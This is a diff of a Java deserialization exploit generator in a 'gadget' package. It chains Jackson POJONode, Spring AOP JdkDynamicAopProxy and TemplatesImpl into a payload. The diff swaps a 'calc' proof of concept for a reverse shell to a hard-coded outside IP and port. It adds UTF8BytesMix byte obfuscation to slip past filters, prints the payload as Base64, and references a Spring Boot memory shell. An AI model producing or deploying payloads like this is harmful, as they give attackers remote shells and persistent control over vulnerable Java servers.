@@ -3,12 +3,16 @@ package gadget;
 import com.fasterxml.jackson.databind.introspect.POJOPropertiesCollector;
 import com.sun.org.apache.xpath.internal.objects.XString;
 import gadget.memshell.SpringBootMemoryShellOfController;
+import gadget.timu.ByteCompare;
+import gadget.timu.MyObjectInputStream;
 import javassist.*;
 import com.fasterxml.jackson.databind.node.POJONode;
 import org.springframework.aop.framework.AdvisedSupport;
 import util.GadgetUtils;
 import util.SerializerUtils;
 import util.TriggertoStringUtils;
+import util.UTF8BytesMix;
+//import com.sun.jndi.ldap.decodeObject;
 
 import javax.management.BadAttributeValueExpException;
 import javax.xml.transform.Templates;
@@ -34,32 +38,40 @@ public class Jackson {
         ctClass.removeMethod(writeReplace);
         // 将修改后的CtClass加载至当前线程的上下文类加载器中
         ctClass.toClass();
-
+//        Object template = GadgetUtils.getTemplatesImplReverseShell("114.67.236.137","19005");
         POJONode node = new POJONode(makeTemplatesImplAopProxy());
 //        POJONode node = new POJONode(template);
 
 
         Object o = TriggertoStringUtils.eventListenerList(node);
-//        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+//        BadAttributeValueExpException o = new BadAttributeValueExpException(node);
 //        Field valfield = val.getClass().getDeclaredField("val");
 //        valfield.setAccessible(true);
 //        valfield.set(val, node);
 //        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
 //        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
 //        oos.writeObject(val);\
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
-        oos.writeObject(o);
+//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
+//        oos.writeObject(o);
 
+        byte[] bytes1 = SerializerUtils.serialize(o);
+        bytes1 = new UTF8BytesMix(bytes1).builder();
+//        InputStream inputStream = new ByteArrayInputStream(bytes1);
+//        MyObjectInputStream myObjectInputStream = new MyObjectInputStream(inputStream);
+//        ByteCompare byteCompare = new ByteCompare();
+//        byteCompare.Compared(bytes1);
+//        myObjectInputStream.readObject();
 
-        SerializerUtils.unserialize(byteArrayOutputStream.toByteArray());
-//        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(val)));
+        System.out.println(Base64.getEncoder().encodeToString(bytes1));
     }
 
     public static Object makeTemplatesImplAopProxy() throws Exception {
         AdvisedSupport advisedSupport = new AdvisedSupport();
-        Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
-        template = GadgetUtils.createTemplatesImpl("calc");
+//        Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
+//        Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
+//        Object template = GadgetUtils.getTemplatesImplReverseShell()
+        Object template = GadgetUtils.getTemplatesImplReverseShell("114.67.236.137","19005");
         advisedSupport.setTarget(template);
         Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
         constructor.setAccessible(true);
